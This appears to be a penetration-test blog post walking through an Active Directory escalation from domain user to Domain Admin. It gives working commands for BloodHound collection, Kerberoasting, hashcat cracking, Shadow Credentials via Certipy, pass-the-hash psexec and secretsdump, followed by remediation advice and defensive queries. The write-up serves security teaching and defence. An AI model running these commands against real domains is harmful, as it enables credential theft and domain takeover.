---
title: "Active Directory Attack Chains: From Domain User to Domain Admin in 4 Steps"
date: 2025-01-08
tags: [#ad, #redteam, #kerberos, #bloodhound, #pentest]
excerpt: A real-world Active Directory attack chain walkthrough — leveraging misconfigured group memberships, Kerberoasting, and ACL abuse to go from a standard domain user to Domain Admin.
---

# Active Directory Attack Chains: From Domain Users to Domain Admin in 4 Steps

This is a walkthrough of an attack chain I documented during an internal penetration test. All details are anonymized and the findings have been remediated. The goal: show how seemingly minor misconfigurations chain together into full domain compromise.

## The Setup

- Target: Mid-size organization (~2000 users, single domain)
- Starting position: Standard domain user account (no special privileges)
- Objective: Domain Admin or equivalent
- Tools: BloodHound CE, Impacket, CrackMapExec, PowerView, Rubeus

## Step 1: Reconnaissance with BloodHound

Always start with BloodHound. Collect data with SharpHound from a domain-joined machine:

```powershell
# From Windows
.\SharpHound.exe -c All --zipfilename bloodhound-data.zip
```

Or remotely with BloodHound Python:

```bash
# From Kali
bloodhound-python -u 'lowpriv_user' -p 'Password123' \
  -d corp.local -c all --zip -ns 192.168.1.10
```

Import the ZIP to BloodHound CE and run the built-in queries. The "Shortest Path to Domain Admins" query revealed:

```
lowpriv_user → [MemberOf] → IT_Helpdesk_Group → [GenericWrite] → svc_backup → [MemberOf] → Domain Admins
```

Four hops. Let's walk them.

## Step 2: Kerberoasting svc_backup

The `IT_Helpdesk_Group` has `GenericWrite` over `svc_backup`. But first — `svc_backup` has an SPN set, making it Kerberoastable.

```bash
# Kerberoast all SPNs
impacket-GetUserSPNs corp.local/lowpriv_user:Password123 \
  -dc-ip 192.168.1.10 -request -outputfile kerberoast.hashes
```

```
$krb5tgs$23$*svc_backup$CORP.LOCAL$corp.local/svc_backup*$a1b2c3...
```

Crack it with hashcat:

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule
```

Result: `svc_backup:Backup@2023!`

Weak service account password. Classic.

## Step 3: Abuse GenericWrite → Shadow Credentials

Wait — why Kerberoast when we have `GenericWrite` on `svc_backup`? 

`GenericWrite` lets us write to any non-protected attribute. We can use this to perform a **Shadow Credentials** attack — writing to `msDS-KeyCredentialLink` to add our own certificate credential.

```bash
# Using Certipy for Shadow Credentials
certipy shadow auto \
  -username lowpriv_user@corp.local \
  -password Password123 \
  -account svc_backup \
  -dc-ip 192.168.1.10
```

This:
1. Generates a key pair
2. Writes the public key to `msDS-KeyCredentialLink` on `svc_backup`
3. Uses PKINIT to authenticate as `svc_backup` and retrieve its NT hash

```
[*] NT hash for 'svc_backup': aad3b435b51404eeaad3b435b51404ee:31d6...
```

Now we have the NT hash without needing to crack a password.

## Step 4: svc_backup → Domain Admins

`svc_backup` is a member of Domain Admins. We can now:

```bash
# Pass-the-Hash to get a shell
impacket-psexec corp.local/svc_backup@dc01.corp.local \
  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Or dump credentials directly
impacket-secretsdump corp.local/svc_backup@dc01.corp.local \
  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**Domain Admin in 4 steps.**

## The Real Problem: Disabled Account Risk

During the same assessment, I found something worse: a **disabled domain admin account** that retained group membership. If re-enabled (even temporarily, by a helpdesk ticket with GenericWrite on users), it immediately has Domain Admin access.

BloodHound query to find these:

```cypher
MATCH (u:User {enabled: false})-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
RETURN u.name, u.description, u.lastlogon
```

**Always clean up group memberships when disabling accounts.**

## Remediation Checklist

| Finding | Fix |
|---------|-----|
| IT_Helpdesk has GenericWrite on service accounts | Remove delegated GenericWrite; use targeted attribute-level ACLs |
| svc_backup in Domain Admins | Service accounts should never be in DA; use a dedicated backup admin account |
| Weak svc_backup password | Enforce MSA/gMSA for service accounts |
| Shadow Credentials attack surface | Audit msDS-KeyCredentialLink attribute; alert on writes |
| Disabled DA accounts with group membership | Script: on disable, auto-remove sensitive group memberships |

## BloodHound Custom Queries

For your BloodHound CE instance:

```cypher
// Find all paths through GenericWrite
MATCH p=shortestPath((u:User {enabled:true})-[:MemberOf|GenericWrite*1..5]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// Kerberoastable users with high-privilege group membership
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN" OR g.name CONTAINS "EXEC"
RETURN u.name, u.description, collect(g.name)
```

---

*Internal pentest. Written authorization obtained. All findings disclosed and remediated before publication.*
